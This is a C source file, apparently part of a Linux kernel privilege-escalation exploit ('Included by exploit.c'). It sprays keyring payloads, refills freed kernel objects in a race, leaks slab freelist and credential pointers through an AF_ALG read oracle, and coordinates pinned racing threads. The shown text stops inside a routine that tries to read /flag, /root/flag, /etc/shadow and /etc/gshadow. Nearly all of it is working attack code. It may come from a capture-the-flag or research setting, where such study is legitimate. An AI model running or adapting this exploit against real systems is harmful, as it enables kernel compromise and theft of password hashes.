/* Retire / leak helpers, prep gate, race workers.  Included by exploit.c. */

static int retire_and_leak_payloads(size_t count, unsigned int attempts,
                                    useconds_t delay, const char *fake_path,
                                    const char *output)
{
    unsigned char fake[H_DIRECT_FAKE_BYTES], one = 0;
    unsigned char *record = NULL, *last = NULL;
    key_serial_t *serials = NULL;
    struct gap_plan plan;
    int ring = -1, rc;
    unsigned int a;

    if (count < H_USER_PAYLOAD_OBJECTS_PER_SLAB || !attempts)
        return -EINVAL;
    rc = read_exact_file(fake_path, fake, sizeof(fake));
    if (rc)
        return rc;
    rc = build_payload_freelist_plan(&plan);
    if (rc)
        return rc;
    ring = create_keyring("retire", KEY_SPEC_PROCESS_KEYRING);
    if (ring < 0)
        return ring;
    serials = calloc(count, sizeof(*serials));
    if (!serials) {
        rc = -ENOMEM;
        goto out;
    }
    rc = spray_carriers(ring, count, fake, serials);
    if (rc)
        goto out;
    for (size_t i = 0; i < count; i++) {
        rc = update_payload(serials[i], &one, 1);
        if (rc)
            goto out;
    }
    rc = global_rcu_gp();
    if (rc)
        goto out;
    /* synchronize_rcu is not rcu_barrier; this merely gives callbacks a turn. */
    usleep(20000);
    for (a = 0; a < attempts; a++) {
        uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
        struct freelist_solution sol;
        size_t length = 0;

        free(record);
        record = NULL;
        rc = afalg_plan_record(&plan, delay, &record, &length);
        if (rc)
            goto out;
        free(last);
        last = record;
        record = NULL;
        if (length < 4096)
            continue;
        extract_freelist_words(last, enc);
        if (solve_freelist(enc, &sol) == 0) {
            rc = write_exact_file(output, last, 4096);
            if (!rc)
                printf("ORACLE_FREELIST_HIT attempt=%u base=%#" PRIx64
                       " random=%#" PRIx64 " freeptr=%u output=%s\n",
                       a + 1, sol.base, sol.random, k2l.freeptr, output);
            goto out;
        }
    }
    rc = last ? write_exact_file(output, last, 4096) : -ENODATA;
    if (!rc) {
        fprintf(stderr,
                "ORACLE_FREELIST_MISS attempts=%u freeptr=%u last_record=%s\n",
                attempts, k2l.freeptr, output);
        rc = -ENOENT;
    }
out:
    if (ring >= 0) {
        (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_REVOKE, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_UNLINK, (unsigned long)ring,
                         (unsigned long)KEY_SPEC_PROCESS_KEYRING, 0, 0);
    }
    free(record);
    free(last);
    free(serials);
    return rc;
}

static int retire_and_leak_filps(size_t count, unsigned int attempts,
                                 useconds_t delay, const char *output)
{
    int *fds = NULL, rc = 0;
    unsigned char *record = NULL, *last = NULL;
    struct gap_plan plan;
    unsigned int a;

    if (count < k2l.files_per_slab || !attempts)
        return -EINVAL;
    rc = build_filp_cred_plan(&plan);
    if (rc)
        return rc;
    fds = calloc(count, sizeof(*fds));
    if (!fds)
        return -ENOMEM;
    for (size_t i = 0; i < count; i++) {
        fds[i] = open("/dev/null", O_RDONLY | O_CLOEXEC);
        if (fds[i] < 0) {
            rc = -errno;
            count = i;
            goto close_files;
        }
    }
close_files:
    for (size_t i = 0; i < count; i++)
        close(fds[i]);
    free(fds);
    fds = NULL;
    if (rc)
        goto out;
    rc = global_rcu_gp();
    if (rc)
        goto out;
    usleep(20000);
    for (a = 0; a < attempts; a++) {
        uint64_t cred;
        unsigned int hits;
        size_t length = 0;

        free(record);
        record = NULL;
        rc = afalg_plan_record(&plan, delay, &record, &length);
        if (rc)
            goto out;
        free(last);
        last = record;
        record = NULL;
        if (length < 4096)
            continue;
        if (scan_filp_cred(last, &cred, &hits) == 0) {
            rc = write_exact_file(output, last, 4096);
            if (!rc)
                printf("ORACLE_FILP_HIT attempt=%u cred=%#" PRIx64
                       " hits=%u output=%s\n", a + 1, cred, hits, output);
            goto out;
        }
    }
    rc = last ? write_exact_file(output, last, 4096) : -ENODATA;
    if (!rc) {
        fprintf(stderr, "ORACLE_FILP_MISS attempts=%u last_record=%s\n",
                attempts, output);
        rc = -ENOENT;
    }
out:
    free(record);
    free(last);
    free(fds);
    return rc;
}

struct k2_prep_gate;

struct race_ctx {
    key_serial_t source_ring;
    key_serial_t destination_ring;
    key_serial_t holding_ring;
    key_serial_t quota_ring;
    key_serial_t *initial_serials;
    size_t initial_count;
    key_serial_t *spray_serials;
    size_t spray_count;
    uint64_t *baseline_markers;
    const unsigned char *fake;
    const char *search_type;
    const char *search_description;
    int cpu;
    unsigned int timeout_ms;
    atomic_int search_started;
    atomic_int search_done;
    atomic_int search_stop;
    atomic_uint search_attempts;
    atomic_int blocker_run;
    atomic_int blocker_started;
    atomic_int blocker_done;
    atomic_int blocker_inflight;
    atomic_uint blocker_reads;
    atomic_int spinner_run;
    atomic_int spinner_ready;
    atomic_int prep_target_ready;
    atomic_int prep_primary_logged;
    atomic_int prep_runtime_ready;
    long search_result;
    int search_errno;
    unsigned long long search_cap_after;
    int search_flag_rc;
    int sched_rc;
    long blocker_result;
    int blocker_errno;
    int blocker_sched_rc;
    int blocker_demote_rc;
    pid_t blocker_tid;
    pid_t blocker_tids[K2_BLOCKER_THREADS];
    atomic_uint blocker_tid_count;
    pid_t search_tid;
    int spinner_sched_rc;
    int owner_index;
    int update_rc;
    int gp_rc;
    int spray_rc;
    unsigned int destination_entries;
    unsigned int quota_links;
    bool quota_packed;
    bool repeat_search;
    bool blocker_prearmed;
    bool trace_critical;
    struct k2_prep_gate *prep_gate;
};

struct k2_prep_worker_arg {
    struct k2_prep_gate *gate;
    unsigned int id;
};

struct k2_prep_subgate_arg {
    struct k2_prep_gate *gate;
    unsigned int group;
};

static unsigned int k2_prep_group_first(unsigned int group)
{
    if (group == 0)
        return 0;
    return k2_prep_prefix + (group - 1) * K2_PREP_GROUP_SIZE;
}

static unsigned int k2_prep_group_count(unsigned int group)
{
    unsigned int first, remaining;

    if (group == 0)
        return k2_prep_prefix;
    first = k2_prep_group_first(group);
    if (first >= k2_prep_workers)
        return 0;
    remaining = k2_prep_workers - first;
    return remaining < K2_PREP_GROUP_SIZE ? remaining : K2_PREP_GROUP_SIZE;
}

static unsigned int k2_prep_group_for_worker(unsigned int id)
{
    if (id < k2_prep_prefix)
        return 0;
    return 1 + (id - k2_prep_prefix) / K2_PREP_GROUP_SIZE;
}

struct k2_prep_gate {
    key_serial_t rings[K2_PREP_GATES_MAX];
    key_serial_t dummy_serial;
    key_serial_t carriers[K2_PREP_WORKERS_MAX];
    unsigned char fake[H_DIRECT_FAKE_BYTES];
    int allocation_cpu;
    int search_cpu;
    bool development_mode;
    unsigned int entries[K2_PREP_GATES_MAX];
    atomic_int worker_go_by_id[K2_PREP_WORKERS_MAX];
    atomic_int group_armed[K2_PREP_GATES_MAX];
    atomic_int worker_ready;
    atomic_int worker_done;
    atomic_uint allocation_seq;
    atomic_uint seq_to_worker[K2_PREP_WORKERS_MAX];
    atomic_int target_id;
    atomic_int target_freed;
    atomic_int target_refilled;
    atomic_int reader_run[K2_PREP_GATES_MAX];
    atomic_int reader_started[K2_PREP_GATES_MAX];
    atomic_int reader_inflight[K2_PREP_GATES_MAX];
    atomic_uint reader_reads[K2_PREP_GATES_MAX];
    atomic_uint reader_tid_count[K2_PREP_GATES_MAX];
    atomic_int spinner_state;
    atomic_int spinner_ready;
    atomic_int guard_state;
    atomic_int guard_ready;
    atomic_uint guard_tid_count;
    atomic_int dummy_started[K2_PREP_GATES_MAX];
    atomic_int dummy_done[K2_PREP_GATES_MAX];
    atomic_int dummy_stop[K2_PREP_GATES_MAX];
    atomic_int dummy_incall[K2_PREP_GATES_MAX];
    atomic_uint dummy_attempts[K2_PREP_GATES_MAX];
    pid_t reader_tids[K2_PREP_GATES_MAX][K2_PREP_READERS_PER_GATE];
    pid_t spinner_tid;
    pid_t guard_tids[K2_PREP_GUARDS];
    pid_t dummy_tids[K2_PREP_GATES_MAX];
    pid_t worker_tids[K2_PREP_WORKERS_MAX];
    long worker_add_result[K2_PREP_WORKERS_MAX];
    int worker_add_errno[K2_PREP_WORKERS_MAX];
    int worker_update_rc[K2_PREP_WORKERS_MAX];
    int worker_affinity_rc[K2_PREP_WORKERS_MAX];
    int target_update_rc;
    long reader_result[K2_PREP_GATES_MAX];
    int reader_errno[K2_PREP_GATES_MAX];
    int reader_sched_rc[K2_PREP_GATES_MAX];
    long dummy_result[K2_PREP_GATES_MAX];
    int dummy_errno[K2_PREP_GATES_MAX];
    int dummy_affinity_rc[K2_PREP_GATES_MAX];
    int spinner_affinity_rc;
    int guard_affinity_rc;
    pthread_t reader_threads[K2_PREP_GATES_MAX][K2_PREP_READERS_PER_GATE];
    pthread_t dummy_threads[K2_PREP_GATES_MAX];
    pthread_t spinner_thread;
    pthread_t guard_threads[K2_PREP_GUARDS];
    pthread_t worker_threads[K2_PREP_WORKERS_MAX];
    struct k2_prep_worker_arg worker_args[K2_PREP_WORKERS_MAX];
    struct k2_prep_subgate_arg reader_args[K2_PREP_GATES_MAX *
                                           K2_PREP_READERS_PER_GATE];
    struct k2_prep_subgate_arg dummy_args[K2_PREP_GATES_MAX];
};

static void *k2_prep_spinner_worker(void *opaque)
{
    struct k2_prep_gate *gate = opaque;

    gate->spinner_tid = (pid_t)syscall(SYS_gettid);
    gate->spinner_affinity_rc = pin_current_thread(gate->search_cpu);
    atomic_store_explicit(&gate->spinner_ready, 1, memory_order_release);
    for (;;) {
        int state = atomic_load_explicit(&gate->spinner_state,
                                         memory_order_acquire);

        if (state < 0)
            break;
        if (state == 0) {
            (void)futex_wait_atomic(&gate->spinner_state, 0);
            continue;
        }
        __asm__ __volatile__("pause" ::: "memory");
    }
    return NULL;
}

static void *k2_prep_guard_worker(void *opaque)
{
    struct k2_prep_gate *gate = opaque;
    unsigned int index = atomic_fetch_add_explicit(
        &gate->guard_tid_count, 1, memory_order_acq_rel);

    if (index < K2_PREP_GUARDS)
        gate->guard_tids[index] = (pid_t)syscall(SYS_gettid);
    gate->guard_affinity_rc = pin_current_thread(gate->allocation_cpu);
    atomic_fetch_add_explicit(&gate->guard_ready, 1, memory_order_release);
    while (atomic_load_explicit(&gate->guard_state,
                                memory_order_acquire) > 0)
        __asm__ __volatile__("pause" ::: "memory");
    return NULL;
}

static void *k2_prep_reader_worker(void *opaque)
{
    struct k2_prep_subgate_arg *arg = opaque;
    struct k2_prep_gate *gate = arg->gate;
    unsigned int group = arg->group;
    key_serial_t serials[1024];
    unsigned int index = atomic_fetch_add_explicit(
        &gate->reader_tid_count[group], 1, memory_order_acq_rel);

    if (index < K2_PREP_READERS_PER_GATE)
        gate->reader_tids[group][index] = (pid_t)syscall(SYS_gettid);
    gate->reader_sched_rc[group] = pin_current_thread(gate->search_cpu);
    if (!gate->reader_sched_rc[group] &&
        setpriority(PRIO_PROCESS, 0, 19) < 0)
        gate->reader_sched_rc[group] = -errno;
    atomic_fetch_add_explicit(&gate->reader_started[group], 1,
                              memory_order_release);
    if (gate->reader_sched_rc[group])
        return NULL;
    while (atomic_load_explicit(&gate->reader_run[group],
                                memory_order_acquire)) {
        atomic_fetch_add_explicit(&gate->reader_inflight[group], 1,
                                  memory_order_acq_rel);
        errno = 0;
        gate->reader_result[group] = keyctl_raw(
            KEYCTL_READ, (unsigned long)gate->rings[group],
            (unsigned long)serials, sizeof(serials), 0);
        gate->reader_errno[group] =
            gate->reader_result[group] < 0 ? errno : 0;
        atomic_fetch_sub_explicit(&gate->reader_inflight[group], 1,
                                  memory_order_acq_rel);
        if (gate->reader_result[group] < 0 ||
            gate->reader_result[group] !=
                (long)(gate->entries[group] * sizeof(key_serial_t)))
            break;
        atomic_fetch_add_explicit(&gate->reader_reads[group], 1,
                                  memory_order_release);
    }
    return NULL;
}

static void *k2_prep_dummy_worker(void *opaque)
{
    struct k2_prep_subgate_arg *arg = opaque;
    struct k2_prep_gate *gate = arg->gate;
    unsigned int group = arg->group;

    gate->dummy_tids[group] = (pid_t)syscall(SYS_gettid);
    gate->dummy_affinity_rc[group] = pin_current_thread(gate->allocation_cpu);
    atomic_store_explicit(&gate->dummy_started[group], 1,
                          memory_order_release);
    if (gate->dummy_affinity_rc[group])
        goto done;
    do {
        atomic_store_explicit(&gate->dummy_incall[group], 1,
                              memory_order_release);
        errno = 0;
        gate->dummy_result[group] = keyctl_raw(
            KEYCTL_LINK, (unsigned long)gate->dummy_serial,
            (unsigned long)gate->rings[group], 0, 0);
        gate->dummy_errno[group] =
            gate->dummy_result[group] < 0 ? errno : 0;
        atomic_store_explicit(&gate->dummy_incall[group], 0,
                              memory_order_release);
        atomic_fetch_add_explicit(&gate->dummy_attempts[group], 1,
                                  memory_order_release);
        if (!atomic_load_explicit(&gate->dummy_stop[group],
                                  memory_order_acquire))
            usleep(20);
    } while (!atomic_load_explicit(&gate->dummy_stop[group],
                                   memory_order_acquire));
done:
    atomic_store_explicit(&gate->dummy_done[group], 1,
                          memory_order_release);
    return NULL;
}

static void *k2_prep_payload_worker(void *opaque)
{
    struct k2_prep_worker_arg *arg = opaque;
    struct k2_prep_gate *gate = arg->gate;
    unsigned int id = arg->id;
    unsigned int group = k2_prep_group_for_worker(id);
    unsigned int seq;
    unsigned char worker_fake[H_DIRECT_FAKE_BYTES];
    char description[64];
    int rc;

    gate->worker_tids[id] = (pid_t)syscall(SYS_gettid);
    atomic_fetch_add_explicit(&gate->worker_ready, 1, memory_order_release);
    while (!atomic_load_explicit(&gate->worker_go_by_id[id],
                                 memory_order_acquire)) {
        rc = futex_wait_atomic(&gate->worker_go_by_id[id], 0);
        if (rc) {
            gate->worker_add_result[id] = -1;
            gate->worker_add_errno[id] = -rc;
            atomic_fetch_add_explicit(&gate->worker_done, 1,
                                      memory_order_release);
            return NULL;
        }
    }
    gate->worker_affinity_rc[id] = pin_current_thread(gate->allocation_cpu);
    seq = atomic_fetch_add_explicit(&gate->allocation_seq, 1,
                                    memory_order_acq_rel);
    if (seq >= k2_prep_workers || seq < k2_prep_group_first(group) ||
        seq >= k2_prep_group_first(group) + k2_prep_group_count(group)) {
        gate->worker_add_result[id] = -1;
        gate->worker_add_errno[id] = EOVERFLOW;
        atomic_fetch_add_explicit(&gate->worker_done, 1,
                                  memory_order_release);
        return NULL;
    }
    atomic_store_explicit(&gate->seq_to_worker[seq], id,
                          memory_order_release);
    memcpy(worker_fake, gate->fake, sizeof(worker_fake));
    put_u32(worker_fake + 4, K2_PREP_SERIAL_BASE | (seq + 1U));
    snprintf(description, sizeof(description), "k2-prep-%ld-%u",
             (long)getpid(), id);
    for (;;) {
        errno = 0;
        gate->worker_add_result[id] =
            add_key_raw("user", description, worker_fake,
                        sizeof(worker_fake), gate->rings[group]);
        gate->worker_add_errno[id] =
            gate->worker_add_result[id] < 0 ? errno : 0;
        if (atomic_load_explicit(&gate->group_armed[group],
                                 memory_order_acquire))
            break;
        usleep(20);
    }
    if (atomic_load_explicit(&gate->target_id,
                             memory_order_acquire) == (int)id) {
        atomic_store_explicit(&gate->target_freed, 1,
                              memory_order_release);
        futex_wake_atomic(&gate->target_freed, INT_MAX);
        /* The failed add just kfree_sensitive()'d this worker's preparsed
         * payload.  Refill from this same thread before another writer can
         * replace the CPU sheaf's LIFO head. */
        gate->worker_update_rc[id] =
            update_carrier(gate->carriers[0], gate->fake);
        gate->target_update_rc = gate->worker_update_rc[id];
        atomic_store_explicit(&gate->target_refilled, 1,
                              memory_order_release);
        futex_wake_atomic(&gate->target_refilled, INT_MAX);
    }
    atomic_fetch_add_explicit(&gate->worker_done, 1, memory_order_release);
    return NULL;
}

static bool wchan_blocked(pid_t tid, const char *extra)
{
    char wchan[128] = {0};

    if (tid <= 0 || read_task_wchan(tid, wchan, sizeof(wchan)) != 0)
        return false;
    if (wchan_is_key_blocked(wchan))
        return true;
    return extra && strstr(wchan, extra);
}

static int k2_prep_gate_prepare(struct k2_prep_gate *gate,
                                const key_serial_t *carriers,
                                size_t carrier_count,
                                const unsigned char fake[H_DIRECT_FAKE_BYTES],
                                int allocation_cpu, int search_cpu)
{
    pthread_attr_t attr;
    unsigned char dummy_payload = 0x5c;
    char dummy_description[64];
    uint64_t deadline;
    unsigned int created = 0;
    int rc, prc;

    if (!gate || carrier_count < K2_PREP_LINKED_CARRIERS)
        return -EINVAL;
    memset(gate, 0, sizeof(*gate));
    atomic_store(&gate->target_id, -1);
    for (unsigned int i = 0; i < k2_prep_workers; i++)
        atomic_store(&gate->seq_to_worker[i], UINT_MAX);
    gate->dummy_serial = -1;
    gate->allocation_cpu = allocation_cpu;
    gate->search_cpu = search_cpu;
    gate->development_mode = panic_on_oops_disabled();
    for (unsigned int group = 0; group < k2_prep_gates; group++)
        gate->rings[group] = -1;
    for (unsigned int i = 0; i < k2_prep_workers; i++)
        gate->carriers[i] = carriers[i % carrier_count];
    memcpy(gate->fake, fake, sizeof(gate->fake));

    for (unsigned int group = 0; group < k2_prep_gates; group++) {
        gate->rings[group] = create_keyring("preparse-destination",
                                            KEY_SPEC_PROCESS_KEYRING);
        if (gate->rings[group] < 0)
            return gate->rings[group];
        for (unsigned int i = 0; i < K2_PREP_LINKED_CARRIERS; i++) {
            if (keyctl_raw(KEYCTL_LINK, (unsigned long)gate->carriers[i],
                           (unsigned long)gate->rings[group], 0, 0) < 0)
                return -errno;
            gate->entries[group]++;
        }
        if (keyctl_raw(KEYCTL_RESTRICT_KEYRING,
                       (unsigned long)gate->rings[group], 0, 0, 0) < 0)
            return -errno;
    }

    snprintf(dummy_description, sizeof(dummy_description),
             "k2-prep-dummy-%ld", (long)getpid());
    gate->dummy_serial = (key_serial_t)add_key_raw(
        "user", dummy_description, &dummy_payload, sizeof(dummy_payload),
        KEY_SPEC_PROCESS_KEYRING);
    if (gate->dummy_serial < 0)
        return -errno;

    prc = pthread_attr_init(&attr);
    if (prc)
        return -prc;
    prc = pthread_attr_setstacksize(&attr, 64 * 1024);
    if (prc) {
        pthread_attr_destroy(&attr);
        return -prc;
    }
    for (unsigned int i = 0; i < k2_prep_workers; i++) {
        gate->worker_args[i] = (struct k2_prep_worker_arg){
            .gate = gate,
            .id = i,
        };
        prc = pthread_create(&gate->worker_threads[i], &attr,
                             k2_prep_payload_worker, &gate->worker_args[i]);
        if (prc) {
            pthread_attr_destroy(&attr);
            return -prc;
        }
        created++;
    }
    pthread_attr_destroy(&attr);
    if (created != k2_prep_workers)
        return -EAGAIN;
    deadline = monotonic_msec() + 20000;
    while (atomic_load_explicit(&gate->worker_ready, memory_order_acquire) <
               (int)k2_prep_workers &&
           monotonic_msec() < deadline)
        sched_yield();
    if (atomic_load(&gate->worker_ready) != (int)k2_prep_workers)
        return -ETIMEDOUT;

    atomic_store(&gate->guard_state, 1);
    for (unsigned int i = 0; i < K2_PREP_GUARDS; i++) {
        prc = pthread_create(&gate->guard_threads[i], NULL,
                             k2_prep_guard_worker, gate);
        if (prc)
            return -prc;
    }
    while (atomic_load_explicit(&gate->guard_ready, memory_order_acquire) <
           (int)K2_PREP_GUARDS)
        sched_yield();
    if (gate->guard_affinity_rc)
        return gate->guard_affinity_rc;

    prc = pthread_create(&gate->spinner_thread, NULL,
                         k2_prep_spinner_worker, gate);
    if (prc)
        return -prc;
    while (!atomic_load_explicit(&gate->spinner_ready, memory_order_acquire))
        sched_yield();
    if (gate->spinner_affinity_rc)
        return gate->spinner_affinity_rc;

    for (unsigned int group = 0; group < k2_prep_gates; group++) {
        bool captured = false;

        gate->dummy_args[group] = (struct k2_prep_subgate_arg){
            .gate = gate,
            .group = group,
        };
        atomic_store(&gate->reader_run[group], 1);
        for (unsigned int reader = 0; reader < K2_PREP_READERS_PER_GATE;
             reader++) {
            unsigned int arg_index = group * K2_PREP_READERS_PER_GATE + reader;

            gate->reader_args[arg_index] = gate->dummy_args[group];
            prc = pthread_create(&gate->reader_threads[group][reader], NULL,
                                 k2_prep_reader_worker,
                                 &gate->reader_args[arg_index]);
            if (prc)
                return -prc;
        }
        while (atomic_load_explicit(&gate->reader_started[group],
                                    memory_order_acquire) <
               (int)K2_PREP_READERS_PER_GATE)
            sched_yield();
        deadline = monotonic_msec() + 2000;
        while (atomic_load_explicit(&gate->reader_reads[group],
                                    memory_order_acquire) < 8 &&
               monotonic_msec() < deadline)
            sched_yield();
        if (atomic_load(&gate->reader_reads[group]) < 8 ||
            gate->reader_sched_rc[group]) {
            fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                    "stage=reader-calibrate reads=%u sched_rc=%d\n", group,
                    atomic_load(&gate->reader_reads[group]),
                    gate->reader_sched_rc[group]);
            return gate->reader_sched_rc[group] ? gate->reader_sched_rc[group]
                   : -EAGAIN;
        }
        prc = pthread_create(&gate->dummy_threads[group], NULL,
                             k2_prep_dummy_worker, &gate->dummy_args[group]);
        if (prc)
            return -prc;
        while (!atomic_load_explicit(&gate->dummy_started[group],
                                     memory_order_acquire))
            sched_yield();
        deadline = monotonic_msec() + 5000;
        while (monotonic_msec() < deadline) {
            if (atomic_load_explicit(&gate->dummy_incall[group],
                                     memory_order_acquire) &&
                atomic_load_explicit(&gate->reader_inflight[group],
                                     memory_order_acquire)) {
                char wchan[128] = {0};

                atomic_store_explicit(&gate->spinner_state, 1,
                                      memory_order_release);
                futex_wake_atomic(&gate->spinner_state, 1);
                usleep(1000);
                if (atomic_load_explicit(&gate->dummy_incall[group],
                                         memory_order_acquire) &&
                    atomic_load_explicit(&gate->reader_inflight[group],
                                         memory_order_acquire) &&
                    read_task_wchan(gate->dummy_tids[group], wchan,
                                    sizeof(wchan)) == 0 &&
                    wchan_is_key_blocked(wchan)) {
                    captured = true;
                    break;
                }
                atomic_store_explicit(&gate->spinner_state, 0,
                                      memory_order_release);
            }
            sched_yield();
        }
        if (!captured) {
            fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                    "stage=dummy-capture attempts=%u inflight=%d incall=%d\n",
                    group, atomic_load(&gate->dummy_attempts[group]),
                    atomic_load(&gate->reader_inflight[group]),
                    atomic_load(&gate->dummy_incall[group]));
            return -EAGAIN;
        }
        {
            unsigned int first = k2_prep_group_first(group);
            unsigned int count = k2_prep_group_count(group);
            unsigned int limit = first + count;
            unsigned int blocked = 0;

            deadline = monotonic_msec() + 30000;
            for (unsigned int batch_first = first; batch_first < limit;
                 batch_first += K2_PREP_ARM_BATCH) {
                unsigned int batch_limit = batch_first + K2_PREP_ARM_BATCH;
                unsigned int batch_blocked = 0;

                if (batch_limit > limit)
                    batch_limit = limit;
                for (unsigned int i = batch_first; i < batch_limit; i++) {
                    atomic_store_explicit(&gate->worker_go_by_id[i], 1,
                                          memory_order_release);
                    futex_wake_atomic(&gate->worker_go_by_id[i], 1);
                }
                do {
                    batch_blocked = 0;
                    for (unsigned int i = batch_first; i < batch_limit; i++)
                        batch_blocked += wchan_blocked(gate->worker_tids[i],
                                                       NULL);
                    if (batch_blocked == batch_limit - batch_first)
                        break;
                    usleep(100);
                } while (monotonic_msec() < deadline);
                if (batch_blocked != batch_limit - batch_first) {
                    fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                            "stage=workers-batch first=%u blocked=%u "
                            "expected=%u done=%d\n", group, batch_first,
                            batch_blocked, batch_limit - batch_first,
                            atomic_load(&gate->worker_done));
                    return -EAGAIN;
                }
            }
            do {
                blocked = 0;
                for (unsigned int i = first; i < first + count; i++)
                    blocked += wchan_blocked(gate->worker_tids[i], NULL);
                if (blocked == count)
                    break;
                usleep(100);
            } while (monotonic_msec() < deadline);
            if (blocked != count) {
                fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                        "stage=workers-block blocked=%u expected=%u done=%d\n",
                        group, blocked, count, atomic_load(&gate->worker_done));
                return -EAGAIN;
            }
            atomic_store_explicit(&gate->group_armed[group], 1,
                                  memory_order_release);
        }
        rc = pin_tid_to_cpu(gate->dummy_tids[group], gate->allocation_cpu);
        if (rc != -ESRCH && rc) {
            fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u stage=move-dummy"
                    " tid=%ld rc=%d\n", group, (long)gate->dummy_tids[group],
                    rc);
            return rc;
        }
        for (unsigned int reader = 0; reader < K2_PREP_READERS_PER_GATE;
             reader++) {
            struct sched_param idle = {0};

            if (sched_setscheduler(gate->reader_tids[group][reader],
                                   SCHED_IDLE, &idle) < 0) {
                rc = -errno;
                fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                        "stage=idle-reader reader=%u tid=%ld rc=%d\n", group,
                        reader, (long)gate->reader_tids[group][reader], rc);
                return rc;
            }
            rc = pin_tid_to_cpu(gate->reader_tids[group][reader],
                                gate->allocation_cpu);
            if (rc == -ESRCH)
                continue;
            if (rc) {
                fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                        "stage=move-reader reader=%u tid=%ld rc=%d\n", group,
                        reader, (long)gate->reader_tids[group][reader], rc);
                return rc;
            }
        }
        if (!atomic_load_explicit(&gate->reader_inflight[group],
                                  memory_order_acquire) ||
            atomic_load_explicit(&gate->worker_done,
                                 memory_order_acquire) >
                (int)k2_prep_workers) {
            fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                    "stage=post-migrate inflight=%d dummy_incall=%d "
                    "dummy_done=%d workers_done=%d\n", group,
                    atomic_load(&gate->reader_inflight[group]),
                    atomic_load(&gate->dummy_incall[group]),
                    atomic_load(&gate->dummy_done[group]),
                    atomic_load(&gate->worker_done));
            return -EAGAIN;
        }
        if (gate->development_mode) {
            printf("PREP_MULTIGATE_REPROVED group=%u inflight=%d guards=%u\n",
                   group, atomic_load(&gate->reader_inflight[group]),
                   K2_PREP_GUARDS);
            fflush(stdout);
        }
        /* Only now may the transient CPU freezer sleep so the next gate's
         * readers can calibrate. */
        atomic_store_explicit(&gate->spinner_state, 0, memory_order_release);
        if (!atomic_load_explicit(&gate->reader_inflight[group],
                                  memory_order_acquire)) {
            fprintf(stderr, "PREP_MULTIGATE_FAIL group=%u "
                    "stage=post-freezer-sleep inflight=0\n", group);
            return -EAGAIN;
        }
    }

    atomic_store_explicit(&gate->spinner_state, -1, memory_order_release);
    futex_wake_atomic(&gate->spinner_state, 1);
    pthread_join(gate->spinner_thread, NULL);
    printf("PREP_RANK_GATES_ARMED gates=%u prefix_workers=%u "
           "critical_workers=%u total_workers=%u allocation_cpu=%d "
           "release_cpu=%d\n", k2_prep_gates, k2_prep_prefix,
           k2_prep_critical, k2_prep_workers, gate->allocation_cpu,
           gate->search_cpu);
    fflush(stdout);
    return 0;
}

static int k2_prep_gate_launch(struct k2_prep_gate *gate)
{
    uint64_t deadline;
    unsigned int blocked = 0;
    int rc;

    rc = pin_current_thread(gate->allocation_cpu);
    if (rc)
        return rc;
    deadline = monotonic_msec() + 20000;
    do {
        blocked = 0;
        for (unsigned int i = 0; i < k2_prep_workers; i++)
            blocked += wchan_blocked(gate->worker_tids[i], NULL);
        if (blocked + (unsigned int)atomic_load(&gate->worker_done) >=
            k2_prep_workers)
            break;
        usleep(100);
    } while (monotonic_msec() < deadline);
    if (blocked + (unsigned int)atomic_load(&gate->worker_done) <
            k2_prep_workers ||
        atomic_load(&gate->worker_done) > (int)k2_prep_workers)
        return -EAGAIN;
    for (unsigned int i = 0; i < k2_prep_workers; i++) {
        rc = pin_tid_to_cpu(gate->worker_tids[i], gate->search_cpu);
        if (rc == -ESRCH)
            continue;
        if (rc)
            return rc;
        if (setpriority(PRIO_PROCESS, gate->worker_tids[i], 19) < 0)
            return -errno;
    }
    printf("PREP_RANK_GATES_ALL_BLOCKED count=%u prefix=%u critical=%u "
           "returned=%d migrated_cpu=%d\n", blocked, k2_prep_prefix,
           k2_prep_critical, atomic_load(&gate->worker_done),
           gate->search_cpu);
    fflush(stdout);
    return pin_current_thread(gate->allocation_cpu);
}

static int k2_prep_gate_release_and_wait(struct k2_prep_gate *gate)
{
    int target = atomic_load_explicit(&gate->target_id,
                                      memory_order_acquire);
    unsigned int group, moved_readers = 0;
    int rc;

    if (target < 0 || target >= (int)k2_prep_workers)
        return -EINVAL;
    group = k2_prep_group_for_worker((unsigned int)target);
    if (group == 0 || group >= k2_prep_gates)
        return -ERANGE;
    atomic_store_explicit(&gate->dummy_stop[group], 1, memory_order_release);
    for (unsigned int reader = 0; reader < K2_PREP_READERS_PER_GATE;
         reader++) {
        rc = pin_tid_to_cpu(gate->reader_tids[group][reader],
                            gate->search_cpu);
        if (rc == -ESRCH)
            continue;
        if (rc)
            return rc;
        moved_readers++;
    }
    rc = pin_tid_to_cpu(gate->dummy_tids[group], gate->search_cpu);
    if (rc != -ESRCH && rc)
        return rc;
    if (!moved_readers && !atomic_load(&gate->reader_inflight[group]) &&
        atomic_load(&gate->worker_done) == 0)
        return -EAGAIN;
    atomic_store_explicit(&gate->reader_run[group], 0, memory_order_release);
    while (!atomic_load_explicit(&gate->target_refilled,
                                 memory_order_acquire)) {
        rc = futex_wait_atomic(&gate->target_refilled, 0);
        if (rc)
            return rc;
    }
    if (gate->worker_add_result[target] >= 0 ||
        gate->worker_add_errno[target] != EPERM || gate->target_update_rc)
        return -EIO;
    printf("PREP_TARGET_REFILLED id=%d gate=%u add_errno=%d update_rc=%d "
           "workers_done=%d\n", target, group,
           gate->worker_add_errno[target], gate->target_update_rc,
           atomic_load(&gate->worker_done));
    fflush(stdout);
    return 0;
}

static void k2_prep_gate_stop_spinners(struct k2_prep_gate *gate)
{
    for (unsigned int group = 0; group < k2_prep_gates; group++)
        atomic_store_explicit(&gate->dummy_stop[group], 1,
                              memory_order_release);
    atomic_store_explicit(&gate->guard_state, 0, memory_order_release);
}

static int try_proof_file(void)
{
    static const char *const paths[] = {
        "/flag", "/root/flag", "/etc/shadow", "/etc/gshadow",
    };
    char buffer[256];

    for (size_t i = 0; i < ARRAY_SIZE(paths); i++) {
        int fd = open(paths[i], O_RDONLY);
        ssize_t n;

